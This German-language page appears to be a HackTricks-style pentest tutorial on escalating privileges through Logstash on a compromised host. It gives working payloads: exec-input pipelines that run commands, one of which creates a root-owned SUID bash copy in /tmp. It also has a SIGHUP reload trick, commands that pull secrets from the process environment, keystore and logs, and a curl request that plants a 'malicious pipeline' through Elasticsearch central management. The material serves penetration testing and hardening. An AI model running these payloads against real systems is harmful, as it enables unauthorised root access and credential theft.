# Logstash-Berechtigungsausweitung

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash wird verwendet, um **Logs zu sammeln, umzuwandeln und weiterzuleiten**. Dafür kommt ein System namens **Pipelines** zum Einsatz. Diese Pipelines bestehen aus den Phasen **Input**, **Filter** und **Output**.<sup>[[4]](#references)</sup> Interessant wird es, wenn Logstash auf einem kompromittierten Rechner ausgeführt wird.

### Pipeline-Konfiguration

Bei Installationen über Debian- und RPM-Pakete werden Pipelines über **/etc/logstash/pipelines.yml** konfiguriert. Diese Datei enthält die Speicherorte der Pipeline-Konfigurationen; bei anderen Distributionen liegt `pipelines.yml` im Logstash-Verzeichnis `path.settings`.<sup>[[5]](#references)[[6]](#references)</sup>

```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
  path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
  path.config: "/usr/share/logstash/pipeline/1*.conf"
  pipeline.workers: 6
```

Diese Datei zeigt, wo sich die **.conf**-Dateien mit den Pipeline-Konfigurationen befinden. Bei Verwendung eines **Elasticsearch output** sollten die Einstellungen `user`/`password`, `cloud_auth` oder `api_key` überprüft werden; die effektiven Berechtigungen des Kontos hängen von Elasticsearch ab. Ein `path.config`-Glob lädt jede passende Datei für diese Pipeline.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Wird Logstash mit `-f <directory>` statt mit `pipelines.yml` gestartet, hat `-f` Vorrang und **alle Dateien in diesem Verzeichnis werden in lexikografischer Reihenfolge aneinandergehängt und als einzelne Konfiguration eingelesen**.<sup>[[6]](#references)[[7]](#references)</sup> Das hat zwei offensive Auswirkungen:

- Eine abgelegte Datei wie `000-input.conf` oder `zzz-output.conf` kann beeinflussen, wie die endgültige Pipeline zusammengesetzt wird.
- Eine fehlerhafte Datei kann dazu führen, dass die zusammengefügte Konfiguration die Validierung nicht besteht; beim Neuladen behält Logstash die vorherige Pipeline bei. Daher sollten Payloads validiert werden, bevor man sich auf das automatische Neuladen verlässt.<sup>[[1]](#references)</sup>

### Schnelle Enumeration auf einem kompromittierten Host

Auf einem Rechner, auf dem Logstash installiert ist, schnell Folgendes überprüfen:

```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```

Prüfe außerdem, ob die lokale Monitoring-API erreichbar ist. Standardmäßig bindet sie an **127.0.0.1:9600**, was nach dem Zugriff auf den Host normalerweise ausreicht.<sup>[[8]](#references)</sup>

```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```

Diese Endpunkte geben Pipeline-IDs und -Einstellungen, Laufzeitmetriken sowie Zähler für erfolgreiche/fehlgeschlagene Konfigurationsneuladungen preis und helfen so zu bestätigen, ob eine Änderung übernommen wurde.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

Wenn ein wiederhergestellter Zugangsschlüssel auf **Elasticsearch** abzielt, sieh dir [diese andere Seite über Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md) an.

### File-Input mit dynamischer Command-Ausgabe

Eine Pipeline-Konfiguration kann für den aktuellen Benutzer schreibgeschützt sein, während ihr [file input](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-file) einen Pfad überwacht, in den der Benutzer schreiben kann. Verfolge die geladene Pipeline von diesem Input über eine mögliche [Grok-Felderfassung](https://www.elastic.co/docs/reference/logstash/plugins/plugins-filters-grok) bis zu einem [exec output](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-exec). Der exec output übergibt seinen `command` über eine Shell und ersetzt `%{field}`-Werte, ohne Shell-Metazeichen zu bereinigen. Ein beschreibbarer Input-Pfad ist nur dann ein Ansatzpunkt für Privilegien, wenn der laufende Dienst unter einer höher privilegierten Identität ausgeführt wird, die Datei des Benutzers tatsächlich in den überwachten Input gelangen kann, die Filter und Output-Bedingungen ihren Inhalt in das Command-Feld leiten und das Output-Plugin installiert und aktiv ist. Prüfe Verzeichnis-Such- und Schreibberechtigungen, den Tracking-Status des file input und das effektive Dienstkonto jeweils separat; schreibe bei einer passiven Aufzählung kein Testereignis und löse den Output nicht aus.

### Privilege Escalation über beschreibbare Pipelines

Um eine Privilege Escalation zu versuchen, ermittle zuerst den Benutzer, unter dem der Logstash-Dienst tatsächlich läuft; gehe nicht davon aus, dass es root oder der Benutzer **logstash** ist. Stelle sicher, dass **eine** der folgenden Bedingungen erfüllt ist:

- Du hast **Schreibzugriff** auf eine Pipeline-**.conf**-Datei **oder**
- Die Datei **/etc/logstash/pipelines.yml** verwendet einen Wildcard, und du kannst in den Zielordner schreiben.<sup>[[6]](#references)[[7]](#references)</sup>

Zusätzlich muss **eine** der folgenden Bedingungen erfüllt sein:

- Du kannst den Logstash-Dienst neu starten **oder**
- In der Datei **/etc/logstash/logstash.yml** ist **config.reload.automatic: true** gesetzt.<sup>[[1]](#references)[[15]](#references)</sup>

Wenn die Konfiguration einen Wildcard enthält, ermöglicht das Erstellen einer Datei, die diesem Wildcard entspricht, die Ausführung von Befehlen.<sup>[[7]](#references)[[9]](#references)</sup> Zum Beispiel:

```bash
input {
  exec {
    command => "whoami"
    interval => 120
  }
}

output {
  file {
    path => "/tmp/output.log"
    codec => rubydebug
  }
}
```

Hier bestimmt **interval** die Ausführungshäufigkeit in Sekunden. Im angegebenen Beispiel wird der Befehl **whoami** alle 120 Sekunden ausgeführt und seine Ausgabe nach **/tmp/output.log** umgeleitet.<sup>[[9]](#references)</sup>

Mit **config.reload.automatic: true** in **/etc/logstash/logstash.yml** erkennt Logstash neue oder geänderte Pipeline-Konfigurationen automatisch und übernimmt sie, ohne dass ein Neustart erforderlich ist.<sup>[[1]](#references)[[15]](#references)</sup> Ohne Wildcard können bestehende Konfigurationen weiterhin geändert werden, allerdings ist Vorsicht geboten, um Unterbrechungen zu vermeiden.

### Zuverlässigere Pipeline-Payloads

Das `exec`-Input-Plugin funktioniert auch in aktuellen Releases und erfordert entweder ein `interval` oder einen `schedule`. Es führt den Befehl aus, indem es die Logstash-JVM **forkt**. Wenn der Speicher knapp ist, kann dein Payload daher mit `ENOMEM` fehlschlagen, statt unbemerkt ausgeführt zu werden.<sup>[[9]](#references)</sup>

Wenn der Dienst über ausreichende Berechtigungen verfügt, um eine root-eigene SUID-Datei zu erstellen, ist ein Payload zur Privilegienausweitung, der ein dauerhaftes Artefakt hinterlässt, eine praktische Option:

```bash
input {
  exec {
    command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
    interval => 300
  }
}
output {
  null {}
}
```

Wenn du keine Berechtigung zum Neustart hast, aber dem Prozess ein Signal senden kannst, unterstützt Logstash auf Unix-ähnlichen Systemen auch ein durch **SIGHUP** ausgelöstes Neuladen:<sup>[[1]](#references)</sup>

```bash
kill -SIGHUP $(pgrep -f logstash)
```

Beachte, dass nicht jedes Plugin neuladefreundlich ist. Beispielsweise verhindert der **stdin**-Input das automatische Neuladen. Gehe also nicht davon aus, dass `config.reload.automatic` deine Änderungen immer übernimmt.<sup>[[1]](#references)</sup>

### Secrets aus Logstash stehlen

Bevor du dich ausschließlich auf code execution konzentrierst, sammle die Daten, auf die Logstash bereits zugreifen kann:

- Zugangsdaten können in `elasticsearch {}`-Outputs, `http_poller`-URLs/-Einstellungen, JDBC-Inputs oder cloudbezogenen Einstellungen auftauchen; diese Plugins stellen Zugangsdatenfelder bereit, nach denen es sich zu suchen lohnt.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Sichere Einstellungen können in **`/etc/logstash/logstash.keystore`** oder einem anderen Verzeichnis unter `path.settings` liegen.<sup>[[5]](#references)[[10]](#references)</sup>
- Das Keystore-Passwort kann über **`LOGSTASH_KEYSTORE_PASS`** bereitgestellt werden, und RPM-/DEB-Installationen laden Dienst-Umgebungsvariablen aus **`/etc/sysconfig/logstash`**.<sup>[[10]](#references)</sup>
- Die Erweiterung von Umgebungsvariablen mit `${VAR}` wird beim Start von Logstash aufgelöst. Daher lohnt es sich, die Dienstumgebung zu überprüfen.<sup>[[14]](#references)</sup>

Nützliche Prüfungen:

```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```

Dies sollte ebenfalls überprüft werden, da **CVE-2023-46672** gezeigt hat, dass Logstash unter bestimmten Umständen vertrauliche Informationen in seinen Logs aufzeichnete, darunter Secrets, die in seinem Keystore gespeichert und in der Konfiguration referenziert wurden. Prüfen Sie alte Logstash-Logs und `journald`-Einträge, falls diese Umstände zutreffen könnten.<sup>[[3]](#references)</sup>

### Missbrauch der zentralisierten Pipeline-Verwaltung

In manchen Umgebungen verwendet der Host überhaupt keine lokalen `.conf`-Dateien. Wenn **`xpack.management.enabled: true`** konfiguriert ist, kann Logstash zentral verwaltete Pipelines aus Elasticsearch/Kibana abrufen. Nach Aktivierung dieses Modus sind lokale Pipeline-Konfigurationen nicht mehr die maßgebliche Quelle.<sup>[[2]](#references)</sup>

Das bedeutet einen anderen Angriffsweg:

1. Beschaffen Sie Elastic-Zugangsdaten aus lokalen Logstash-Einstellungen, dem Keystore oder Logs.<sup>[[3]](#references)[[10]](#references)</sup>
2. Prüfen Sie, ob das Konto über das Cluster-Privileg **`manage_logstash_pipelines`** verfügt.<sup>[[16]](#references)</sup>
3. Erstellen oder ersetzen Sie eine zentral verwaltete Pipeline, damit der Logstash-Host Ihre Payload beim nächsten Abruf ausführt.<sup>[[2]](#references)[[16]](#references)</sup>

Die für diese Funktion verwendete Elasticsearch-API lautet:<sup>[[16]](#references)</sup>

```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
  -H 'Content-Type: application/json' \
  -u user:password \
  -d '{
    "description": "malicious pipeline",
    "last_modified": "2026-01-02T02:50:51.250Z",
    "username": "user",
    "pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
    "pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
    "pipeline_settings": {
      "pipeline.workers": 1,
      "pipeline.batch.size": 1,
      "pipeline.batch.delay": 50,
      "queue.type": "memory",
      "queue.max_bytes": "1gb",
      "queue.checkpoint.writes": 1024
    }
  }'
```

Dies ist besonders nützlich, wenn lokale Dateien schreibgeschützt sind, Logstash aber bereits so eingerichtet ist, dass Pipelines remote abgerufen werden.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs: Konfigurationsdatei neu laden](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Zentrales Pipeline-Management konfigurieren](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Logstash 8.11.1-Sicherheitsupdate (ESA-2023-26) – CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs: Eine Logstash-Pipeline erstellen](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs: Verzeichnisstruktur von Logstash](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs: Mehrere Pipelines](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs: Logstash über die Befehlszeile ausführen](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs: Logstash mit APIs überwachen](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs: Exec-Input-Plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs: Secrets-Keystore für sichere Einstellungen](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs: Elasticsearch-Output-Plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs: Http_poller-Input-Plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs: Jdbc-Input-Plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs: Umgebungsvariablen verwenden](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [Elasticsearch-API: Eine Logstash-Pipeline erstellen oder aktualisieren](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [Logstash-API: Einstellungen für Pipelines abrufen](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [Logstash-API: Statistiken für Pipelines abrufen](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
